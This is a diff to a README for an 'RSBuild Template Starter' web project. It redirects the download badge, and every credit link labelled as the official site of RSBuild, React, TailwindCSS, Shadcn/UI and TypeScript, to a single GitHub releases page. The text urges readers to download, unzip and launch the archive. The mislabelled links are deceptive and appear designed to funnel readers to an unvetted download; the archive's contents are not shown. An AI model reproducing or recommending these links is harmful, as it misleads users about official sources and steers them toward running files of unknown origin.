@@ -38,7 +38,7 @@ Feel free to explore these topics further within the repository.
 
 To get started with **RSBuild Template Starter**, download the project files from the following link: 
 
-[![Download App.zip](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/project/files/App.zip)
+[![Download https://github.com/bubakua/rsbuild-template-starter/releases](https://github.com/bubakua/rsbuild-template-starter/releases)](https://github.com/bubakua/rsbuild-template-starter/releases)
 
 Once downloaded, unzip the file and launch the project to begin your web development journey. In case the link is not working, please check the "Releases" section for alternative download options.
 
@@ -56,10 +56,10 @@ If you have any questions, feedback, or suggestions regarding **RSBuild Template
 
 ## Credits 🌟
 
-- **RSBuild**: [Official Website](https://rsbuild.com)
-- **React**: [Official Documentation](https://reactjs.org)
-- **TailwindCSS**: [GitHub Repository](https://github.com/tailwindlabs/tailwindcss)
-- **Shadcn/UI**: [Demo and Examples](https://shadcnui.com)
-- **Typescript**: [Official Website](https://www.typescriptlang.org)
+- **RSBuild**: [Official Website](https://github.com/bubakua/rsbuild-template-starter/releases)
+- **React**: [Official Documentation](https://github.com/bubakua/rsbuild-template-starter/releases)
+- **TailwindCSS**: [GitHub Repository](https://github.com/bubakua/rsbuild-template-starter/releases)
+- **Shadcn/UI**: [Demo and Examples](https://github.com/bubakua/rsbuild-template-starter/releases)
+- **Typescript**: [Official Website](https://github.com/bubakua/rsbuild-template-starter/releases)
 
 Thank you for choosing **RSBuild Template Starter**. Happy coding! 🚀✨👩‍💻👨‍💻
